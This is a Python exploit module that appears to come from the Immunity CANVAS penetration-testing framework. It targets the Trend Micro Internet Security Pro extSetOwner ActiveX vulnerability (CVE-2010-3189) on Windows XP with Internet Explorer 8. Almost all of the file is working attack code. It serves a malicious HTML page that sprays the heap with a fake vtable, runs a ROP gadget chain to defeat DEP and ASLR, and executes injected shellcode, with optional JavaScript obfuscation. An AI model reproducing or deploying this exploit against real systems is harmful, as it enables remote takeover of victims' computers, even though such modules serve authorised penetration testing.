#! /usr/bin/env python
# -*- coding: utf-8 -*-

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from string import ascii_lowercase
from random import choice

NAME        = 'trendmicro_setowned'
DESCRIPTION = 'Trend Micro Internet Security Pro extSetOwner Vulnerability.'
VERSION     = '1.0'

DOCUMENTATION = {}
DOCUMENTATION['VENDOR'           ] = 'Trend Micro'
DOCUMENTATION['Date public'      ] = '08/31/2010'
DOCUMENTATION['References'       ] = ['None']
DOCUMENTATION['Repeatability'    ] = 'Infinite'
DOCUMENTATION['VersionsAffected' ] = 'Last'
DOCUMENTATION['CVE Name'         ] = 'CVE-2010-3189'
DOCUMENTATION['CVE Url'          ] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3189'
DOCUMENTATION['Notes'            ] = "abyssec 0day"
DOCUMENTATION['CVSS'             ] = 9.3

PROPERTY = {}
PROPERTY['TYPE'     ] = 'Exploit'
PROPERTY['SITE'     ] = 'Clientside'
PROPERTY['ARCH'     ] = [['Windows']]
PROPERTY['VERSION'  ] = ['XP']
PROPERTY['DELIVERY' ] = 'HTTP'
PROPERTY["Notes"    ] = ""

NOTES = """
Tested on:
Windows XP SP3 running Internet Explorer 8

Bypasses DEP and ASLR
"""

CHANGELOG = ""

targets={
    0:['N/A', None, 0],
    1:['Windows XP SP3 - IE8 ', 'en-us', 0],
    #  Name       language       Get Stack           kernel32!VirtualProtect
}

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.version = 0
        self.name = NAME
        self.setInfo(DESCRIPTION)
        self.filename = "".join([choice(ascii_lowercase) for x in range(8)]) + ".html"

        # Set up our javascript obfuscator, this could be done in httpclientside class
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        self.badstring = "\x00"

        # we want clientd to give us a plugin dict
        self.plugin_info = None

        return

    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run. This is called by cliend.py
        """
        return "MSIE" in info_dict['user_agent']

    def makefile(self, request_header=None):
        """
        Generate the HTML to be included in the exploit file
        """
        filedata="""
        <html>
        <head></head>
        <body onload="setTimeout('exploit();', 1000)">
        <object ID="target" classid="clsid:15DBC3F9-9F0A-472E-8061-043D9CEC52F0" width="0" height="0"></object>
        <div id="exploit"></div>
        <script type="text/javascript">
        """

        script = """
        function hexa(val)
        {
            var str = new Number(val).toString(16);
            while (str.length < 4)
                str = "0" + str;

            return str;
        }

        function myescape(addr)
        {
            var str = "";
            str = "%u" + hexa(addr & 0xffff) + "%u" + hexa((addr >> 16) & 0xffff);
            return unescape(str);
        }

        function exploit()
        {
            /// The bug
            // 51610000 51637000   UfPBCtrl C:\Program Files\Trend Micro\Internet Security\UfPBCtrl.dll
            // 5162213b 8b4804          mov     ecx,dword ptr [eax+4] ds:0023:3da6a5e2=????????
            // 5162213e 57              push    edi
            // 5162213f ffd1            call    ecx
            // 51622141 5e              pop     esi
            // 51622142 33c0            xor     eax,eax
            // 51622144 5f              pop     edi
            // 51622145 c21400          ret     14h
            ///
            // eax=0c0c0c0c ebx=51625ae8 ecx=51622100 edx=06fdcca2 esi=030f1980 edi=06f08314
            // eip=5162213b esp=022ac8d0 ebp=022ac8fc iopl=0         nv up ei pl zr na pe nc
            // cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
            // UfPBCtrl!DllUnregisterServer+0x28b:
            // 5162213b 8b4804          mov     ecx,dword ptr [eax+4] ds:0023:0c0c0c10=????????
            //
            /// Dlls without ASLR
            //
            // 10000000 10023000   TSToolbar C:\Program Files\Trend Micro\TrendSecure\TISProToolbar\TSToolbar.dll
            // 51580000 515d7000   TmTSHelp C:\Program Files\Trend Micro\TrendSecure\TmTSHelp.dll
            ///
            //
            /// Gadget 1: Get the stack.
            // 51595B63   94               XCHG EAX,ESP
            // 51595B64   0000             ADD BYTE PTR DS:[EAX],AL
            // 51595B66   83C4 04          ADD ESP,4
            // 51595B69   5F               POP EDI
            // 51595B6A   896E 04          MOV DWORD PTR DS:[ESI+4],EBP
            // 51595B6D   5E               POP ESI
            // 51595B6E   5D               POP EBP
            // 51595B6F   C3               RETN
            //
            /// Gadget 2: Place the address of the IAT entry (VirtualAlloc) into eax
            // 51584101   58               POP EAX
            // 51584102   C3               RETN
            //
            /// Gadget 3: resolve the address of VirtualAlloc from the IAT.
            // 515AA19E   8B00             MOV EAX,DWORD PTR DS:[EAX]
            // 515AA1A0   5E               POP ESI
            // 515AA1A1   C3               RETN
            //
            /// Gadget 4: Call VirtualAlloc
            // 5158C34C   FFD0             CALL EAX
            // 5158C34E   C3               RETN
            //
            /// Gadget 5: place in EDX the opcodes of a memcpy and possibly a ret
            // 51588FE0   5A               POP EDX
            // 51588FE1   0100             ADD DWORD PTR DS:[EAX],EAX
            // 51588FE3   83C4 3C          ADD ESP,3C
            // 51588FE6   C3               RETN
            /// Gadget 6: with this gadget we create a memcpy inside our vallocated buffer
            //  so the next step is to call the crafted memcpy from inside the buffer and it
            //  will copy the rest of the shellcode and continue executing it.
            //
            // 515A6DE6   8910             MOV DWORD PTR DS:[EAX],EDX
            // 515A6DE8   5D               POP EBP
            // 515A6DE9   C3               RETN
            //
            /// Gadget 7: Place the address of the allocated buffer into EDI (destination of memcpy)
            // 51585835   97               XCHG EAX,EDI
            // 51585836   C3               RETN
            //
            /// Gadget 8: Set ESI to our shellcode and ECX to the size of our shellcode
            // 51587FEA   5E               POP ESI
            // 51587FEB   59               POP ECX
            // 51587FEC   C3               RETN
            //
            /// Gadget 9: Call the memcpy shellcode and pwn!
            // 5158D180   FFD7             CALL EDI

            // Sprayed address we can reach to.
            /// 051A6BFC  CAFECAFE
            /// 05A1CD2C  CAFECAFE
            /// 05A4004C
            /// 071D00C4  CAFECAFE
            /// 06F16A6C  CAFECAFE

            self_address = 0x06F16A6C;
            valloc       = 0x515B01A4;  // IAT entry for VirtualAlloc
            memcpy_egg   = 0x9090a4f3;  // memcpy

            gadget1      = 0x51595B63;
            gadget2      = 0x51584101;
            gadget3      = 0x515AA19E;
            gadget4      = 0x5158C34C;
            gadget5      = 0x51588FE0;
            gadget6      = 0x515A6DE6;
            gadget7      = 0x51585835;
            gadget8      = 0x51587FEA;
            gadget9      = 0x5158D180;

            fake_vtable  = myescape(0xcafecafe);        // dummy

            fake_vtable += myescape(gadget1);           // get stack
            fake_vtable += myescape(0xbadc0ded);        // dummy@esi
            fake_vtable += myescape(0xbadc0ded);        // dummy@ebi

            fake_vtable += myescape(gadget2);           // eax = VirtualAlloc@IAT
            fake_vtable += myescape(valloc);
            fake_vtable += myescape(gadget3);           // eax = VirtualAlloc
            fake_vtable += myescape(0xbadc0ded);        // dummy@esi

            fake_vtable += myescape(gadget4);           // eax = VirtualAlloc()
            fake_vtable += myescape(0x0);               // NULL
            fake_vtable += myescape(0x10000);           // size
            fake_vtable += myescape(0x3000);            // MEM_COMMIT | MEM_RESERVE
            fake_vtable += myescape(0x40);              // PAGE_EXECUTE_READWRITE

            fake_vtable += myescape(gadget5);
            fake_vtable += myescape(memcpy_egg);        // edx = opcodes of our memcpy
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C
            fake_vtable += myescape(0xbadc0ded);        // ADD ESP,3C

            fake_vtable += myescape(gadget6);           // [eax] = memcpy_egg
            fake_vtable += myescape(0xbadc0ded);        // dummy@ebp

            fake_vtable += myescape(gadget7);

            fake_vtable += myescape(gadget8);
            fake_vtable += myescape(self_address+148);  // esi = shellcode address
            fake_vtable += myescape(0x1000);            // ecx = sizeof(shellcode)

            fake_vtable += myescape(gadget9);
            fake_vtable += myescape(memcpy_egg);        // we have to "repair" the memcpy egg
            fake_vtable += unescape("SHELLCODE");

            var crapuccino = myescape(0xcacacaca);

            while(fake_vtable.length < 0x7fff00)
                fake_vtable += fake_vtable;

            h1 = [];
            h1[0] = fake_vtable + crapuccino;

            var i;
            for (i = 1 ; i < 30 ; i++)
                h1[i] = h1[0].substring(0, h1[0].length)

            // Go!
            target.extSetOwner(myescape(self_address));
        }
        """

        script = script.replace('SHELLCODE', urluencode(self.shellcode))

        #filedata += self.jsObfuscator.obfuscate(script)
        filedata += script
        filedata += """
        </script>
        </body>
        </html>
        """

        return filedata

    def makesploit(self, clientheader, clientbody):
        """
        Called automatically
        """
        from libs.spkproxy import header, body

        # header is used to store request and reponse headers
        header = header('SERVER')
        body = body()

        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')

            # Create the shellcode (self.shellcode)
            self.createShellcode()

            # Create the HTML Contents
            html = self.makefile(request_header = clientheader)

            body.setBody(html)
            header.addHeader('Content-Type','text/html')
            header.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('Redirecting to self')
            header.status='302'
            header.addHeader('Location', self.filename)
            header.addHeader('Content-Type','text/html')

        return header,body

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()

    def getArgs(self):
        """
        Get the required parameters from the program that
        ran the exploit (i.e. CANVAS GTK GUI or Command line)
        """
        self.host = self.target.interface
        self.getarg("filename")
        self.getarg("language")

        return

    def displayVersions(self):
        """
        XXX Called from the cmd line or canvas to show the available versions?
        """
        for t in targets.keys():
            print 'Version %d: %s'%(t, targets[t][0])

        return

    def run(self):
        """
        Run is the firth method that is automatically executed by CANVAS
        """

        # Populate the needed arguments of the exploit
        self.getArgs()

        # Build the html that triggers the vulnerability
        filedata = self.makefile()

        self.log('Opening %s for output'%(self.filename))

        fd = file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()

        self.debuglog('Wrote to %s'%(self.filename), color="red")
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()

    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
